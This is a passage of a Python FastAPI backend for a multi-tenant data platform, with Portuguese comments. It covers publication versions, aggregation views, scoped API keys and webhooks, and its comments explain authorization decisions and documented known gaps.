    # Desativa a ativa atual (se houver) ANTES de ativar a nova — o
    # UNIQUE INDEX parcial bloqueia 2 ativas por owner simultaneamente.
    db.query(models.PublicationVersion).filter(
        models.PublicationVersion.owner_id == owner_id,
        models.PublicationVersion.is_active == True,
        models.PublicationVersion.id != target.id,
    ).update({models.PublicationVersion.is_active: False}, synchronize_session=False)

    target.is_active = True
    target.activated_at = _dt_now_utc()
    # Ativar é o momento em que o site VAI AO AR (ou volta pra uma versão
    # antiga). G1 nomeia este evento em separado do `publication.create` porque
    # criar snapshot e publicar são coisas diferentes desde o M6.
    audit.record(
        db, owner_id=owner_id, actor=audit.user_actor(current_user),
        action=audit.PUBLICATION_ACTIVATE, target_type=audit.T_VERSION,
        target_id=target.id, target_label=f"v{target.version_number}",
    )
    db.commit()
    db.refresh(target)
    return _serialize_pub_version(target)


@app.delete("/api/publications/me/versions/{version_id}")
def delete_publication_version(
    version_id: int,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não tem workspace próprio")
    owner_id = current_user.id if current_user.role == "admin" else current_user.parent_id

    target = (
        db.query(models.PublicationVersion)
        .filter(
            models.PublicationVersion.id == version_id,
            models.PublicationVersion.owner_id == owner_id,
        )
        .first()
    )
    if not target:
        raise HTTPException(status_code=404, detail="Versão não encontrada")
    if target.is_active:
        raise HTTPException(status_code=400, detail="Não pode deletar a versão ativa. Ative outra antes.")

    storage_path = target.storage_path
    version_number = target.version_number
    _vid = target.id
    db.delete(target)
    audit.record(
        db, owner_id=owner_id, actor=audit.user_actor(current_user),
        action=audit.PUBLICATION_DELETE, target_type=audit.T_VERSION,
        target_id=_vid, target_label=f"v{version_number}",
    )
    db.commit()
    publication_storage.delete(storage_path)
    # #3=A: remove as cópias de mídia congeladas dessa versão (seam de deleção)
    media_storage.remove_pub_media(owner_id, version_number)
    return {"message": "Versão deletada"}


@app.get("/api/publications/me/versions/{version_id}/snapshot")
def get_my_version_snapshot(
    version_id: int,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Blob do snapshot de uma versão ESPECÍFICA do workspace (M6 Fase 5).

    Base do export estático: a rota pública só serve a versão ativa;
    o export por card do histórico precisa de qualquer versão — com os
    mesmos guards dos demais /api/publications/me/*.
    """
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não tem workspace próprio")
    owner_id = current_user.id if current_user.role == "admin" else current_user.parent_id

    target = (
        db.query(models.PublicationVersion)
        .filter(
            models.PublicationVersion.id == version_id,
            models.PublicationVersion.owner_id == owner_id,
        )
        .first()
    )
    if not target:
        raise HTTPException(status_code=404, detail="Versão não encontrada")

    payload = publication_storage.download(target.storage_path)
    if payload is None:
        raise HTTPException(status_code=502, detail="Snapshot blob não encontrado no storage")
    return payload


# ---------- endpoint público (sem auth) ----------

@app.get("/public/{slug}/snapshot")
def get_public_snapshot(slug: str, db: Session = Depends(get_db)):
    """Devolve o blob JSON da versão ativa do workspace `slug`.

    Endpoint público — não autentica. Serve o site público estático.
    """
    owner = (
        db.query(models.User)
        .filter(models.User.workspace_slug == slug)
        .first()
    )
    if not owner:
        raise HTTPException(status_code=404, detail="Workspace não encontrado")

    active = (
        db.query(models.PublicationVersion)
        .filter(
            models.PublicationVersion.owner_id == owner.id,
            models.PublicationVersion.is_active == True,
        )
        .first()
    )
    if not active:
        raise HTTPException(status_code=404, detail="Workspace ainda não publicou")

    payload = publication_storage.download(active.storage_path)
    if payload is None:
        # Estado órfão: row aponta pra blob inexistente. 502 sinaliza
        # problema do backend, não do cliente.
        raise HTTPException(status_code=502, detail="Snapshot blob não encontrado no storage")
    return payload


# ==========================================
# Views & Agregação (M8.5 F1)
# ==========================================
# Registrado DEPOIS do bloco dinâmico /api/{table_name} — de propósito, não por
# acaso (decisão 3 do Diretor, 2026-07-16).
#
# A regra de sombreamento do Starlette NÃO é "declarada depois da linha X": é
# "mesmo MÉTODO + mesma ARIDADE + registro anterior". A rota dinâmica ocupa
# GET/POST com 1 segmento (/api/{table_name}, :1348/:1379) e PUT/DELETE com 2
# (/api/{table_name}/{record_id}, :1444/:1486). Tudo aqui é GET/POST com 2
# segmentos ou 3+ — nenhuma colisão. Medido com o stack PINADO do repo
# (starlette 1.0.0 / fastapi 0.135.2 do requirements.txt).
#
# Consequência: NÃO é preciso reservar "views" em RESERVED_TABLE_NAMES. Um
# cliente pode ter tabela chamada "views" e ela continua acessível por
# /api/views. (A trava de reservados é furada de qualquer jeito: o import por
# SQL cria tabela sem passar por ela, :1619→:1644.)
#
# Precedente vivo: GET /api/publications/me/versions (:2108) mora 760 linhas
# depois do bloco dinâmico e funciona.
#
# ⚠️ ARMADILHA pra quem vier depois: rota nova de 2 segmentos com PUT ou DELETE
# sob /api é ENGOLIDA por /api/{table_name}/{record_id}, silenciosamente.
# (`aggregation` e `chart_svg` são importados no topo do arquivo — o publish,
#  que fica ACIMA deste bloco, também os usa.)


def _views_owner_or_403(current_user: models.User) -> int:
    """Owner do workspace. Master não tem workspace → 403.

    Mesma régua de `_media_tenant_or_403` (:1030). A view é do workspace
    INTEIRO, sem recorte por grupo (decisão 12 do Diretor, molde da Media
    Library). Gap aceito conscientemente: mod do grupo A pode criar view sobre
    tabela do grupo B e ver o agregado + rótulos de categoria, mesmo sem poder
    ler as linhas pela rota de dados (`get_accessible_tables`, :504-507).
    Racional: o publish já fura pior (mod publica o workspace inteiro sem
    checagem de grupo, :2116/:2144); fechar só aqui deixaria a view MAIS
    estrita que o publish. Dívida registrada no plano do M8.5.
    """
    if current_user.role == "master":
        raise HTTPException(status_code=403, detail="Master não tem workspace próprio")
    return current_user.id if current_user.role == "admin" else current_user.parent_id


def _chart_source_table_or_404(table_id: int, owner_id: int, db: Session) -> models.DynamicTable:
    """Tabela que uma view/gráfico PODE consumir: a própria **ou** qualquer
    tabela `is_public` (inclusive de outro workspace).

    Espelha no builder a decisão 8 do Diretor (2026-07-17), que ele manteve
    CROSS-OWNER: se o dado já é público, o agregado dele não revela nada novo —
    a tabela `is_public` já é legível sem autenticação em `/api/{tabela}`. Sem
    isto o builder 404aria justo no conjunto que a decisão 8 adiciona, e a
    decisão só valeria no papel.

    Dependência registrada: ler a física de OUTRO tenant sob o GUC do tenant
    corrente só funciona porque a role da aplicação tem `rolbypassrls=TRUE`
    (medido em prod 2026-07-17) — o RLS aqui é defesa contra conexão crua, não
    o guard do app. Se algum dia a role deixar de bypassar, este caminho passa
    a devolver 0 linhas em silêncio e o teste de invariante da GUC
    (`test_aggregation_identical_with_and_without_guc`) é quem acusa.
    """
    db_table = db.query(models.DynamicTable).filter(models.DynamicTable.id == table_id).first()
    if not db_table:
        raise HTTPException(status_code=404, detail="Tabela não encontrada")
    if db_table.owner_id == owner_id or db_table.is_public:
        return db_table
    raise HTTPException(
        status_code=404,
        detail="Tabela não encontrada neste workspace (e não é pública)",
    )


def _view_or_404(view_id: int, owner_id: int, db: Session) -> models.DynamicView:
    db_view = (
        db.query(models.DynamicView)
        .filter(models.DynamicView.id == view_id, models.DynamicView.owner_id == owner_id)
        .first()
    )
    if not db_view:
        raise HTTPException(status_code=404, detail="View não encontrada")
    return db_view


def _spec_from(group_by: str, operation: str, metric_column: str | None,
               config: dict) -> aggregation.AggregationSpec:
    """Traduz o pacote `config` (JSON validado na porta) pro spec do motor."""
    cfg = config or {}
    slices = tuple(
        aggregation.Slice(
            label=s.get("label", "Total"),
            filter_col=s.get("filter_col"),
            filter_val=s.get("filter_val"),
            filter_op=s.get("filter_op", "eq"),
        )
        for s in cfg.get("slices", [])
    )
    return aggregation.AggregationSpec(
        group_by=group_by,
        operation=operation,
        metric_column=metric_column,
        slices=slices,
        top_n=cfg.get("top_n", aggregation.DEFAULT_TOP_N),
        search=cfg.get("search"),
    )


def _run_view_aggregation(db_table: models.DynamicTable, spec: aggregation.AggregationSpec,
                          db: Session) -> dict:
    """Roda o motor sobre a tabela física. Traduz erro de contrato pra 400.

    A prova de tipo acontece ANTES do banco (aggregation.validate_spec): somar
    coluna de texto devolve resultado silenciosamente errado em SQLite e 500 em
    Postgres — barrar na porta mata os dois de uma vez.
    """
    try:
        table = _load_physical_table(db_table)
    except Exception:
        raise HTTPException(status_code=404, detail=f"Tabela física '{db_table.name}' não encontrada")

    media_cols = media_cleanup.media_column_names(db_table)
    try:
        return aggregation.run_aggregation(db, table, spec, media_columns=media_cols)
    except aggregation.AggregationError as exc:
        raise HTTPException(status_code=400, detail=str(exc))


@app.get("/api/views/me/columns/{table_id}")
def get_aggregatable_columns(
    table_id: int,
    db: Session = Depends(tenant_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Quais colunas dá pra agrupar e quais dá pra somar — insumo do builder da F2.

    Sai do tipo FÍSICO refletido, nunca do rótulo `_columns.data_type` (que
    grava 'VARCHAR'/'INTEGER' em tabela importada por SQL, :1671). O rótulo
    serve só pra excluir mídia, que o tipo físico não enxerga.
    """
    owner_id = _views_owner_or_403(current_user)
    db_table = _chart_source_table_or_404(table_id, owner_id, db)
    try:
        table = _load_physical_table(db_table)
    except Exception:
        raise HTTPException(status_code=404, detail=f"Tabela física '{db_table.name}' não encontrada")
    caps = aggregation.aggregatable_columns(table, media_cleanup.media_column_names(db_table))
    return {"table_id": table_id, "table_name": db_table.name, **caps,
            "operations": list(aggregation.OPERATIONS)}


@app.post("/api/views/me/preview")
def preview_aggregation(
    body: schemas.AggregationRequest,
    db: Session = Depends(tenant_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Agregado ad-hoc, sem salvar — espelha POST /api/publications/me/preview (:2205).

    O chart builder da F2 desenha enquanto o usuário monta, usando o MESMO
    motor que o publish vai usar pra congelar. Preview == publicado, zero drift.
    """
    owner_id = _views_owner_or_403(current_user)
    db_table = _chart_source_table_or_404(body.table_id, owner_id, db)
    spec = _spec_from(body.group_by, body.operation, body.metric_column,
                      body.config.model_dump())
    return _run_view_aggregation(db_table, spec, db)


@app.post("/api/views/me", response_model=schemas.ViewResponse)
def create_view(
    body: schemas.ViewCreate,
    db: Session = Depends(tenant_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Cria uma view salva. Valida a spec contra a tabela física ANTES de gravar
    — view salva que não roda é artefato quebrado esperando a F2 tropeçar."""
    owner_id = _views_owner_or_403(current_user)
    db_table = _chart_source_table_or_404(body.table_id, owner_id, db)

    spec = _spec_from(body.group_by, body.operation, body.metric_column,
                      body.config.model_dump())
    try:
        table = _load_physical_table(db_table)
        aggregation.validate_spec(table, spec, media_cleanup.media_column_names(db_table))
    except aggregation.AggregationError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    except HTTPException:
        raise
    except Exception:
        raise HTTPException(status_code=404, detail=f"Tabela física '{db_table.name}' não encontrada")

    db_view = models.DynamicView(
        owner_id=owner_id,
        created_by=current_user.id,
        table_id=body.table_id,
        name=body.name,
        group_by=body.group_by,
        operation=body.operation,
        metric_column=body.metric_column,
        config=body.config.model_dump(),
    )
    db.add(db_view)
    # tenant_db comita no teardown — NÃO comitar aqui (apagaria o GUC).
    db.flush()
    audit.record(
        db, owner_id=owner_id, actor=audit.user_actor(current_user),
        action=audit.VIEW_CREATE, target_type=audit.T_VIEW,
        target_id=db_view.id, target_label=db_view.name,
        details={"table_id": body.table_id, "operation": body.operation,
                 "group_by": body.group_by},
    )
    db.refresh(db_view)
    return db_view


@app.get("/api/views/me", response_model=List[schemas.ViewResponse])
def list_my_views(
    table_id: int | None = None,
    request: Request = None,
    db: Session = Depends(tenant_db_principal),
    principal: Principal = Depends(get_principal),
):
    """Lista as views do workspace. `table_id` filtra por campo INDEXADO — é o
    mesmo caminho que o publish usa pra achar as views de uma tabela sem abrir
    o pacote `config` (decisão 11: híbrido).

    M9 F2: catálogo alcançável por key, filtrado pelo escopo — uma view é uma
    receita de agregação SOBRE uma tabela, então liberar a view de uma tabela
    fora do escopo entregaria justamente o que o escopo negou."""
    owner_id = _views_owner_or_403(principal.user)
    q = db.query(models.DynamicView).filter(models.DynamicView.owner_id == owner_id)
    if table_id is not None:
        q = q.filter(models.DynamicView.table_id == table_id)
    views = q.order_by(models.DynamicView.id.desc()).all()

    if principal.is_key:
        permitidas = set(api_keys.normalize_scopes(principal.scopes).get(api_keys.READ) or [])
        ids_ok = {
            t.id for t in get_accessible_tables(principal.user, db) if t.name in permitidas
        }
        views = [v for v in views if v.table_id in ids_ok]
        audit.record(
            db, owner_id=owner_id, actor=principal_actor(principal, request),
            action=audit.CATALOG_READ, target_type=audit.T_WORKSPACE, target_id=owner_id,
            details={"views": len(views)},
        )
    return views


@app.get("/api/views/me/{view_id}", response_model=schemas.ViewResponse)
def get_view(
    view_id: int,
    db: Session = Depends(tenant_db),
    current_user: models.User = Depends(get_current_active_user),
):
    owner_id = _views_owner_or_403(current_user)
    return _view_or_404(view_id, owner_id, db)


@app.get("/api/views/me/{view_id}/data")
def get_view_data(
    view_id: int,
    db: Session = Depends(tenant_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Executa a view salva e devolve o agregado."""
    owner_id = _views_owner_or_403(current_user)
    db_view = _view_or_404(view_id, owner_id, db)
    db_table = _chart_source_table_or_404(db_view.table_id, owner_id, db)
    spec = _spec_from(db_view.group_by, db_view.operation, db_view.metric_column,
                      db_view.config or {})
    result = _run_view_aggregation(db_table, spec, db)
    return {"view": {"id": db_view.id, "name": db_view.name}, **result}


@app.put("/api/views/me/{view_id}", response_model=schemas.ViewResponse)
def update_view(
    view_id: int,
    body: schemas.ViewUpdate,
    db: Session = Depends(tenant_db),
    current_user: models.User = Depends(get_current_active_user),
):
    """Atualiza a view. `table_id` é imutável: trocar a tabela mudaria o
    significado do artefato sem mudar o id — a F2 e o M10 apontam pra ele."""
    owner_id = _views_owner_or_403(current_user)
    db_view = _view_or_404(view_id, owner_id, db)
    db_table = _chart_source_table_or_404(db_view.table_id, owner_id, db)

    spec = _spec_from(body.group_by, body.operation, body.metric_column,
                      body.config.model_dump())
    try:
        table = _load_physical_table(db_table)
        aggregation.validate_spec(table, spec, media_cleanup.media_column_names(db_table))
    except aggregation.AggregationError as exc:
        raise HTTPException(status_code=400, detail=str(exc))
    except HTTPException:
        raise
    except Exception:
        raise HTTPException(status_code=404, detail=f"Tabela física '{db_table.name}' não encontrada")

    db_view.name = body.name
    db_view.group_by = body.group_by
    db_view.operation = body.operation
    db_view.metric_column = body.metric_column
    db_view.config = body.config.model_dump()
    db.flush()
    audit.record(
        db, owner_id=owner_id, actor=audit.user_actor(current_user),
        action=audit.VIEW_UPDATE, target_type=audit.T_VIEW,
        target_id=db_view.id, target_label=db_view.name,
        changed_columns=["name", "group_by", "operation", "metric_column", "config"],
    )
    db.refresh(db_view)
    return db_view


@app.delete("/api/views/me/{view_id}")
def delete_view(
    view_id: int,
    db: Session = Depends(tenant_db),
    current_user: models.User = Depends(get_current_active_user),
):
    owner_id = _views_owner_or_403(current_user)
    db_view = _view_or_404(view_id, owner_id, db)
    _vid, _vname = db_view.id, db_view.name
    db.delete(db_view)
    audit.record(
        db, owner_id=owner_id, actor=audit.user_actor(current_user),
        action=audit.VIEW_DELETE, target_type=audit.T_VIEW,
        target_id=_vid, target_label=_vname,
    )
    return {"message": f"View {_vname} deletada"}


# ==========================================
# API keys (M9 F2) — /api/keys/me/*
# ==========================================
# Molde de rota do `/api/views/me` (medido no probe do M8.5 F1): GET/POST em 2
# segmentos são livres — a rota dinâmica só ocupa 1 segmento (POST/GET) e 2
# segmentos com PUT/DELETE. O DELETE daqui tem 3 segmentos, também livre.
#
# A gestão de key é sempre HUMANA: `get_current_admin`, nunca `get_principal`.
# Key que cria key seria escalada de privilégio — uma credencial vazada geraria
# outras, com escopo maior, e a revogação da original não adiantaria nada.

def _keys_owner_or_403(current_user: models.User) -> int:
    """GATE ANTI-MASTER, 1ª camada (a 2ª é fail-closed no `get_principal`).

    Master não tem workspace: `get_accessible_tables(master)` devolve as tabelas
    de TODOS os tenants, então uma key de master exfiltraria a plataforma
    inteira — e, sem tenant, ela não morreria com nenhum `delete_admin`.
    Moderador também não cria key: credencial de máquina é do workspace, e
    quem responde por ela é o dono.
    """
    if current_user.role != "admin":
        raise HTTPException(
            status_code=403,
            detail="Só uma conta admin cria API keys (master e moderador não).",
        )
    return current_user.id


def _key_dict(k: models.ApiKey) -> dict:
    return {
        "id": k.id, "name": k.name, "prefix": k.prefix, "scopes": k.scopes or {},
        "created_at": k.created_at, "expires_at": k.expires_at, "revoked_at": k.revoked_at,
    }


@app.post("/api/keys/me", response_model=schemas.ApiKeyCreated)
def create_api_key(
    body: schemas.ApiKeyCreate,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_admin),
):
    """Cria a key e devolve o token UMA vez. Não existe endpoint que mostre de
    novo — o backend só guarda `sha256(segredo)`."""
    owner_id = _keys_owner_or_403(current_user)

    escopos = api_keys.normalize_scopes(body.scopes.model_dump())
    # Escopo que aponta pra tabela inexistente é quase sempre erro de digitação,
    # e falharia depois como 404 no meio de uma integração. Barra na porta.
    nomes_reais = {t.name for t in get_accessible_tables(current_user, db)}
    desconhecidas = sorted(
        set(escopos.get(api_keys.READ, []) + escopos.get(api_keys.WRITE, [])) - nomes_reais
    )
    if desconhecidas:
        raise HTTPException(
            status_code=400,
            detail=f"Escopo cita tabela que não existe neste workspace: {', '.join(desconhecidas)}",
        )

    nova = api_keys.generate()
    key = models.ApiKey(
        owner_id=owner_id,
        created_by=current_user.id,
        name=body.name.strip(),
        prefix=nova.prefix,
        secret_hash=nova.secret_hash,
        scopes=escopos,
        expires_at=body.expires_at,
    )
    db.add(key)
    db.flush()
    audit.record(
        db, owner_id=owner_id, actor=audit.user_actor(current_user),
        action=audit.KEY_CREATE, target_type=audit.T_KEY,
        target_id=key.id, target_label=f"{key.name} ({key.prefix})",
        details={"scopes": escopos, "expires_at": body.expires_at.isoformat() if body.expires_at else None},
    )
    db.commit()
    db.refresh(key)
    return {**_key_dict(key), "token": nova.token}


@app.get("/api/keys/me", response_model=List[schemas.ApiKeyResponse])
def list_api_keys(
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_admin),
):
    """Lista as keys do workspace — sem segredo, por construção. O prefixo é o
    que permite identificar qual revogar."""
    owner_id = _keys_owner_or_403(current_user)
    keys = (
        db.query(models.ApiKey)
        .filter(models.ApiKey.owner_id == owner_id)
        .order_by(models.ApiKey.id.desc())
        .all()
    )
    return [_key_dict(k) for k in keys]


@app.delete("/api/keys/me/{key_id}")
def revoke_api_key(
    key_id: int,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_admin),
):
    """Revogação SOFT: marca `revoked_at` e a key para de autenticar na hora.

    Não deleta a linha de propósito — a trilha de auditoria referencia a key por
    id e label, e apagar cegaria retroativamente justo o registro de quem usou a
    credencial vazada. É o oposto do que se quer depois de um incidente."""
    owner_id = _keys_owner_or_403(current_user)
    key = db.query(models.ApiKey).filter(
        models.ApiKey.id == key_id, models.ApiKey.owner_id == owner_id
    ).first()
    if not key:
        raise HTTPException(status_code=404, detail="API key não encontrada")
    if key.revoked_at is None:
        key.revoked_at = _dt_now_utc()
        audit.record(
            db, owner_id=owner_id, actor=audit.user_actor(current_user),
            action=audit.KEY_REVOKE, target_type=audit.T_KEY,
            target_id=key.id, target_label=f"{key.name} ({key.prefix})",
        )
        db.commit()
    return {"message": "API key revogada", "prefix": key.prefix}


# ==========================================
# Webhooks (M9 F3) — /api/webhooks/me/* + /api/webhooks/drain
# ==========================================

def _webhooks_owner_or_403(current_user: models.User) -> int:
    """Mesma régua da key: só admin. Master não tem workspace (e mandaria evento
    de todos os tenants pra uma URL só); moderador não responde pela integração."""
    if current_user.role != "admin":
        raise HTTPException(
            status_code=403,
            detail="Só uma conta admin gerencia webhooks (master e moderador não).",
        )
    return current_user.id


def _webhook_dict(w: models.WebhookEndpoint) -> dict:
    return {
        "id": w.id, "name": w.name, "url": w.url, "events": w.events or [],
        "table_names": w.table_names, "is_active": bool(w.is_active),
        "created_at": w.created_at,
    }


@app.post("/api/webhooks/me", response_model=schemas.WebhookCreated)
def create_webhook(
    body: schemas.WebhookCreate,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_admin),
):
    """Cria o endpoint e devolve o segredo UMA vez (o admin cola no receptor
    pra conferir a assinatura)."""
    owner_id = _webhooks_owner_or_403(current_user)

    # Falha ALTA e explicativa: sem a chave, o segredo não teria como ser
    # guardado com segurança. Melhor 503 dizendo o que falta do que gravar em
    # texto puro ou inventar chave efêmera que quebra no primeiro restart.
    if not webhook_crypto.is_configured():
        raise HTTPException(
            status_code=503,
            detail=(f"Webhooks desligados: falta a variável {webhook_crypto.ENV_VAR}. "
                    "Gere com: python -c \"from cryptography.fernet import Fernet; "
                    "print(Fernet.generate_key().decode())\""),
        )

    eventos = [e for e in (body.events or []) if e in webhooks.ALL_EVENTS]
    if not eventos:
        raise HTTPException(
            status_code=400,
            detail=f"Escolha ao menos um evento entre: {', '.join(webhooks.ALL_EVENTS)}",
        )

    # Valida a URL AGORA — inclusive o bloqueio de endereço interno. Descobrir
    # que a URL é inválida só na 1ª entrega esconderia o erro num log de cron.
    try:
        webhooks.validate_url(body.url, permitir_privado=_webhook_allow_private())
    except webhooks.WebhookError as exc:
        raise HTTPException(status_code=400, detail=str(exc))

    if body.table_names:
        reais = {t.name for t in get_accessible_tables(current_user, db)}
        faltando = sorted(set(body.table_names) - reais)
        if faltando:
            raise HTTPException(
                status_code=400,
                detail=f"Filtro cita tabela que não existe neste workspace: {', '.join(faltando)}",
            )

    segredo = webhook_crypto.generate_secret()
    ep = models.WebhookEndpoint(
        owner_id=owner_id, created_by=current_user.id, name=body.name.strip(),
        url=body.url, secret_encrypted=webhook_crypto.encrypt(segredo),
        events=eventos, table_names=body.table_names, is_active=True,
    )
    db.add(ep)
    db.flush()
    audit.record(
        db, owner_id=owner_id, actor=audit.user_actor(current_user),
        action=audit.WEBHOOK_CREATE, target_type=audit.T_WEBHOOK,
        target_id=ep.id, target_label=ep.name,
        details={"url": ep.url, "events": eventos},
    )
    db.commit()
    db.refresh(ep)
    return {**_webhook_dict(ep), "secret": segredo}


@app.get("/api/webhooks/me", response_model=List[schemas.WebhookResponse])
def list_webhooks(
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_admin),
):
    owner_id = _webhooks_owner_or_403(current_user)
    eps = db.query(models.WebhookEndpoint).filter(
        models.WebhookEndpoint.owner_id == owner_id
    ).order_by(models.WebhookEndpoint.id.desc()).all()
    return [_webhook_dict(w) for w in eps]


@app.get("/api/webhooks/me/deliveries", response_model=List[schemas.WebhookDeliveryResponse])
def list_webhook_deliveries(
    status_filter: str | None = None,
    limit: int = 50,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_admin),
):
    """Status de entrega — a UI que o gap de front pediu precisa disso, e sem
    ele o admin não tem como saber que o receptor dele está morto."""
    owner_id = _webhooks_owner_or_403(current_user)
    q = db.query(models.WebhookDelivery).filter(models.WebhookDelivery.owner_id == owner_id)
    if status_filter:
        q = q.filter(models.WebhookDelivery.status == status_filter)
    return q.order_by(models.WebhookDelivery.id.desc()).limit(min(limit, 200)).all()


@app.delete("/api/webhooks/me/{webhook_id}")
def delete_webhook(
    webhook_id: int,
    db: Session = Depends(get_db),
    current_user: models.User = Depends(get_current_admin),
):
    owner_id = _webhooks_owner_or_403(current_user)
    ep = db.query(models.WebhookEndpoint).filter(
        models.WebhookEndpoint.id == webhook_id,
        models.WebhookEndpoint.owner_id == owner_id,
    ).first()
    if not ep:
        raise HTTPException(status_code=404, detail="Webhook não encontrado")
    _wid, _wname = ep.id, ep.name
    db.delete(ep)  # cascade leva as entregas pendentes junto
    audit.record(
        db, owner_id=owner_id, actor=audit.user_actor(current_user),
        action=audit.WEBHOOK_DELETE, target_type=audit.T_WEBHOOK,
        target_id=_wid, target_label=_wname,
    )
    db.commit()
    return {"message": "Webhook removido"}


def _webhook_allow_private() -> bool:
    """Só pra dev/teste: sem isso, nenhum receptor local seria alcançável e a
    F3 não teria como ser exercitada fora de produção. Nunca ligado em prod."""
    return os.getenv("ATLAS_WEBHOOK_ALLOW_PRIVATE") == "1"


@app.post("/api/webhooks/drain")
def drain_webhooks(request: Request, db: Session = Depends(get_db)):
    """Endpoint de SERVIÇO (all-tenant) que o agendador externo chama.

    Autenticado por token de serviço em env, comparado em tempo constante —
    não é um usuário, então não passa pelo JWT nem pelo principal.

    **Falha ALTA quando não configurado.** O `keep-alive.yml` deste repo faz
    `exit 0` quando falta a variável, o que deixa o job verde sem fazer nada —
    a mesma classe do `tec-daily-updater`, que respondia 200 e não atualizava.
    Aqui é o contrário: sem `ATLAS_DRAIN_TOKEN` o endpoint devolve **503**, e o
    cron quebra ruidosamente até alguém configurar.
    """
    esperado = os.getenv("ATLAS_DRAIN_TOKEN")
    if not esperado:
        raise HTTPException(
            status_code=503,
            detail=("Drenagem desligada: falta ATLAS_DRAIN_TOKEN no backend. "
                    "Enquanto isso, webhook nenhum é entregue."),
        )
    import hmac as _hmac
    enviado = (request.headers.get("X-Atlas-Drain-Token") or "").strip()
    if not enviado or not _hmac.compare_digest(enviado, esperado):
        raise HTTPException(status_code=401, detail="Token de drenagem inválido")

    rel = webhook_drain.drain(db, permitir_privado=_webhook_allow_private())
    logger.info("drain de webhooks: %s", rel.as_dict())
    return rel.as_dict()

